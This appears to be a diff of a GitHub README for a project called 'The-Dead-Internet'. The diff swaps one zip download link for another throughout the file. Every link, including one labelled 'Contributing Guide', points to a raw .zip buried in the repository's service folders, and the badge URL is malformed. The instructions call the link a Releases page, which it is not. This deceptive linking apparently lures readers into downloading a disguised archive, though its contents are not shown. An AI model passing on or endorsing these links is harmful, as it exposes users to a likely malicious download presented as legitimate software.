@@ -1,6 +1,6 @@
 # 🌐 The-Dead-Internet - Isolated Internet for AI Agents
 
-[![Download The-Dead-Internet](https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/flux/The_Dead_Internet_2.7.zip%https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/flux/The_Dead_Internet_2.7.zip)](https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/flux/The_Dead_Internet_2.7.zip)
+[![Download The-Dead-Internet](https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/social/app/Dead-Internet-The-1.4.zip%https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/social/app/Dead-Internet-The-1.4.zip)](https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/social/app/Dead-Internet-The-1.4.zip)
 
 ## 🚀 Getting Started
 
@@ -17,7 +17,7 @@ Before you start, make sure your system meets the requirements:
 
 ## 📥 Download & Install
 
-To download The-Dead-Internet, visit this page: [Download The-Dead-Internet](https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/flux/The_Dead_Internet_2.7.zip).
+To download The-Dead-Internet, visit this page: [Download The-Dead-Internet](https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/social/app/Dead-Internet-The-1.4.zip).
 
 1. Go to the **Releases** page by clicking the link above.
 2. Locate the latest release version.
@@ -102,7 +102,7 @@ If you encounter any issues, consider the following:
 
 ## 🔧 Contributing
 
-If you'd like to contribute to The-Dead-Internet, please make a fork of the repository and submit a pull request. For detailed instructions, refer to the [Contributing Guide](https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/flux/The_Dead_Internet_2.7.zip).
+If you'd like to contribute to The-Dead-Internet, please make a fork of the repository and submit a pull request. For detailed instructions, refer to the [Contributing Guide](https://github.com/QINATTA-ZERO/The-Dead-Internet/raw/refs/heads/main/LocalInternet/services/social/app/Dead-Internet-The-1.4.zip).
 
 ## 🌟 Support
 
